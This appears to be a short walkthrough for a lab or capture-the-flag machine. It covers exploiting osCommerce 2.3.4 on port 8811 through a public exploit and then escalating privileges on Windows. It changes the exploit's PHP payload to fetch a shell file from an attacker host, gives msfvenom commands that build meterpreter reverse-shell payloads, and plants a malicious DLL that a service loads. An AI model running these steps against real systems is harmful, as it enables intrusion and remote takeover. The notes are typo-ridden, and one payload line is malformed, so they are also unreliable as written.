@@ -1,0 +1,27 @@
+You find on Port 8811  osCommerce running on the server withversion 2.3.4 
+You can use this exploit https://www.exploit-db.com/exploits/44374
+
+Change this part
+payload = '\');'
+payload += 'system("ls");'    # this is where you enter you PHP payload
+payload += '/*'
+
+TO
+
+payload = '\');'payload += 'exec("curl http:/IP:8080/shell22.php -o shell22.php");'    payload += '/*'
+
+
+msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=22 -f raw > /root/Desktop/exploits/shell22.php
+THE PAYLAOD SHOULD BE A METERPRETER PAYLOAD OR THE SHELL WILL DIE ALL TIME !
+
+PrivEsc
+
+You find under C:\Program Files\CustomService a Serive.
+The Service lods ANY dll from C:\Program Files\CustomService\Ext
+Create a MFVENOM a ddl payload
+
+msfvenom -p Windows/meterpreter/reverse_tcp LHOST=IP LPORT=22 -f dll > /root/Desktop/exploits/shell.dll
+
+Place the DLL in the C:\Program Files\CustomService\Ext folder
+You can not restart the service but you can restart the server itself.
+Start a Listner and use shutdown /r to restart the server.
